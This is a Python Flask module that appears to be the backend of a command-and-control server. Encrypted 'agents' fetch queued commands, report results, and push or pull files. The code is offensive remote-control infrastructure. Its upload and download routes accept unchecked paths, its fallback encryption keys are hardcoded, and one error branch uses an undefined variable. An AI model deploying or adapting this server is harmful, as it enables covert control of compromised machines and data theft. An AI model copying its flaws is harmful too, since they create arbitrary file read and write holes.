# client/app.py
from flask import Blueprint, request, jsonify, json
import sqlite3
from datetime import datetime
import base64
import os

client_bp = Blueprint('client', __name__, url_prefix='/api/client')

MASTER_KEY = os.environ.get("MASTER_KEY")

def encrypt_data(data, key_hex):
    from app import encrypt_data as enc
    return enc(data, key_hex)

def decrypt_data(encrypted_b64, key_hex):
    from app import decrypt_data as dec
    return dec(encrypted_b64, key_hex)

def get_aes_key(uuid):
    conn = sqlite3.connect("db.sqlite")
    cursor = conn.cursor()
    cursor.execute("SELECT aes_key_encrypted FROM agents WHERE uuid = ?", (uuid,))
    row = cursor.fetchone()
    conn.close()
    if not row:
        return None
    encrypted_key_data = row[0]
    key_data = decrypt_data(encrypted_key_data, MASTER_KEY)
    return key_data["key"]

@client_bp.route('/get-command', methods=['GET'])
def get_last_pending_command():
    try:
        client_id = request.headers.get("X-Client-ID")
        if not client_id:
            fallback_key = "0123456789abcdef0123456789abcdef" 
            err_msg = {"message": "X-Client-ID header missing"}
            return jsonify({"data": encrypt_data(err_msg, fallback_key)}), 400

        aes_key = get_aes_key(client_id)
        if not aes_key:
            err_msg = {"message": "Invalid or unknown client"}
            return jsonify({"data": encrypt_data(err_msg, fallback_key)}), 400

        conn = sqlite3.connect("db.sqlite")
        cursor = conn.cursor()

        
        cursor.execute("UPDATE agents SET last_seen = ?, status = 'active' WHERE uuid = ?", 
                       (datetime.utcnow().isoformat(), client_id))

        
        cursor.execute("""
            SELECT c.id, c.command_text, c.arguments
            FROM Commands c
            JOIN AgentCommands ac ON c.id = ac.command_id
            JOIN agents a ON ac.agent_id = a.id
            WHERE a.uuid = ? AND c.status = 'pending'
            ORDER BY c.created_at DESC
            LIMIT 1
        """, (client_id,))
        
        command = cursor.fetchone()

        if command:
            response = {
                "command_id": command[0],
                "command": command[1] or "",
                "arguments": command[2] or ""
            }
            log_message = f"Command sent to agent {client_id}: {command[1]}"
            print(log_message)  
        else:
            response = {"message": "no pending command"}

        conn.commit()
        conn.close()

        encrypted = encrypt_data(response, aes_key)
        return jsonify({"data": encrypted}), 200

    except Exception as e:
        print(f"[ERROR in get-command] {e}")
        fallback_key = "0123456789abcdef0123456789abcdef"
        return jsonify({"data": encrypt_data({"message": "server error"}, fallback_key)}), 500

@client_bp.route('/results', methods=['POST'])
def create_result():
    try:
        client_id = request.headers.get("X-Client-ID")
        if not client_id:
            return jsonify({"data": encrypt_data({"message": "X-Client-ID missing"}, "00000000000000000000000000000000")}), 400

        aes_key = get_aes_key(client_id)
        if not aes_key:
            return jsonify({"data": encrypt_data({"message": "invalid client"}, "00000000000000000000000000000000")}), 400

        encrypted_data = request.json.get("data")
        payload = decrypt_data(encrypted_data, aes_key)

        command_id = payload.get("command_id")
        result_text = payload.get("result", "")
        success = payload.get("success", True)

        conn = sqlite3.connect("db.sqlite")
        cursor = conn.cursor()
        new_status = "completed" if success else "failed"
        cursor.execute("UPDATE Commands SET status = ? WHERE id = ?", (new_status, command_id))
        cursor.execute("INSERT INTO Results (command_id, result_data, created_at) VALUES (?, ?, ?)",
                       (command_id, result_text, datetime.utcnow().isoformat()))
        conn.commit()
        conn.close()

        return jsonify({"data": encrypt_data({"status": "success"}, aes_key)}), 200

    except Exception as e:
        return jsonify({"data": encrypt_data({"message": str(e)}, "00000000000000000000000000000000")}), 500

@client_bp.route('/upload', methods=['POST'])
def client_upload():
    try:
        client_id = request.headers.get("X-Client-ID")
        aes_key = get_aes_key(client_id)
        if not aes_key:
            return jsonify({"data": encrypt_data({"message": "invalid client"}, "00000000000000000000000000000000")}), 400

        encrypted_data = request.json.get("data")
        payload = decrypt_data(encrypted_data, aes_key)

        file_path = payload.get("path", "").strip()
        filename = payload.get("filename", "uploaded_file")
        file_data_b64 = payload.get("data", "")

        if not file_path or not file_data_b64:
            return jsonify({"data": encrypt_data({"message": "missing data"}, aes_key)}), 400

        full_path = os.path.abspath(os.path.join(file_path, filename))
        os.makedirs(os.path.dirname(full_path), exist_ok=True)
        with open(full_path, 'wb') as f:
            f.write(base64.b64decode(file_data_b64))

        return jsonify({"data": encrypt_data({"status": "success"}, aes_key)}), 200

    except Exception as e:
        return jsonify({"data": encrypt_data({"message": str(e)}, "00000000000000000000000000000000")}), 500

@client_bp.route('/download', methods=['POST'])
def client_download():
    try:
        client_id = request.headers.get("X-Client-ID")
        aes_key = get_aes_key(client_id)
        if not aes_key:
            return jsonify({"data": encrypt_data({"message": "invalid client"}, "00000000000000000000000000000000")}), 400

        encrypted_data = request.json.get("data")
        payload = decrypt_data(encrypted_data, aes_key)
        file_path = payload.get("path", "").strip()

        if not file_path:
            return jsonify({"data": encrypt_data({"message": "no path"}, aes_key)}), 400

        full_path = os.path.abspath(file_path)
        if not os.path.exists(full_path) or os.path.isdir(full_path):
            return jsonify({"data": encrypt_data({"message": "file not found"}, aes_key)}), 404

        with open(full_path, 'rb') as f:
            file_data = base64.b64encode(f.read()).decode('utf-8')

        response = {
            "filename": os.path.basename(full_path),
            "data": file_data,
            "size": os.path.getsize(full_path)
        }
        return jsonify({"data": encrypt_data(response, aes_key)}), 200

    except Exception as e:
        return jsonify({"data": encrypt_data({"message": str(e)}, "00000000000000000000000000000000")}), 500